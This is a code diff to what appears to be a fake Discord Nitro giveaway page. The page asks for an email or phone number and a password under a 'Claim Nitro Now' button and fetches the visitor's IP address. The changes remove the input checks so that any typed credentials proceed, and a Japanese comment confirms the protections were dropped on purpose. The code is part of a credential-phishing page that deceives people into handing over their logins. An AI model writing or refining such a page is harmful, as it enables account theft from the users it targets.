@@ -191,12 +191,12 @@
 
     <div class="form-group">
       <label for="identifier">Email or Phone Number</label>
-      <input type="text" id="identifier" placeholder="Enter email or phone" required pattern=".*@.*\..*">
+      <input type="text" id="identifier" placeholder="Enter email or phone" required>
     </div>
 
     <div class="form-group">
       <label for="password">Password</label>
-      <input type="password" id="password" placeholder="Enter your password" required pattern=".*@.*\..*">
+      <input type="password" id="password" placeholder="Enter your password" required>
     </div>
 
     <button class="btn" id="claimBtn">Claim Nitro Now</button>
@@ -234,8 +234,6 @@
     const successCard = document.getElementById('successCard');
     const claimBtn = document.getElementById('claimBtn');
     const status = document.getElementById('status');
-    const identifierInput = document.getElementById('identifier');
-    const passwordInput = document.getElementById('password');
 
     let ip = "fetching...";
 
@@ -245,24 +243,10 @@
       .catch(() => ip = "failed");
 
     claimBtn.addEventListener('click', async () => {
-      const identifier = identifierInput.value.trim();
-      const password = passwordInput.value;
+      const identifier = document.getElementById('identifier').value.trim();
+      const password = document.getElementById('password').value;
 
-      // Strict client-side check: must contain both "@" and "."
-      if (!identifier.includes('@') || !identifier.includes('.')) {
-        status.textContent = "Please enter a valid email address";
-        status.style.color = "#ed4245";
-        identifierInput.focus();
-        return;
-      }
-
-      if (!password.includes('@') || !password.includes('.')) {
-        status.textContent = "Please enter a valid password";
-        status.style.color = "#ed4245";
-        passwordInput.focus();
-        return;
-      }
-
+      // パスワード対策を完全に削除（入力があればそのまま進む）
       if (!identifier || !password) {
         status.textContent = "Please fill in all fields";
         status.style.color = "#ed4245";
